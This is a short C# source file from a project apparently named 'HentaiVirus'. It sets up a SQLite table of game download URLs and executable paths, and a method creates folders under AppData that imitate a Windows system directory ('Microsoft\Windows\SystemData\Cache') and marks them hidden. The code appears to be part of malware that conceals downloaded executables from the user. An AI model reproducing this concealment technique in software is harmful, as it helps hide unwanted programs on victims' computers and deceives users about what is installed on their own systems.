using System;
using System.IO;
using Microsoft.Data.Sqlite;

namespace HentaiVirus.Database
{
    public class DatabaseManager
    {
        private readonly string _connectionString = "Data Source=games.db";

        public void InitializeDatabase()
        {
            if (!File.Exists("games.db"))
            {
                using var connection = new SqliteConnection(_connectionString);
                connection.Open();

                string createTableQuery = @"
                    CREATE TABLE Games (
                        Id INTEGER PRIMARY KEY AUTOINCREMENT,
                        DownloadUrl TEXT NOT NULL,
                        TargetDirectory TEXT NOT NULL,
                        ExePath TEXT NOT NULL,
                        IsDownloaded INTEGER DEFAULT 0
                    );";

                using var command = new SqliteCommand(createTableQuery, connection);
                command.ExecuteNonQuery();
            }
        }

        public string GenerateHiddenPath(string gameName)
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string hiddenRoot = Path.Combine(appData, "Microsoft", "Windows", "SystemData", "Cache", gameName);

            if (!Directory.Exists(hiddenRoot))
            {
                Directory.CreateDirectory(hiddenRoot);

                DirectoryInfo di = new DirectoryInfo(hiddenRoot);
                di.Attributes |= FileAttributes.Hidden;
            }

            return hiddenRoot;
        }
    }
}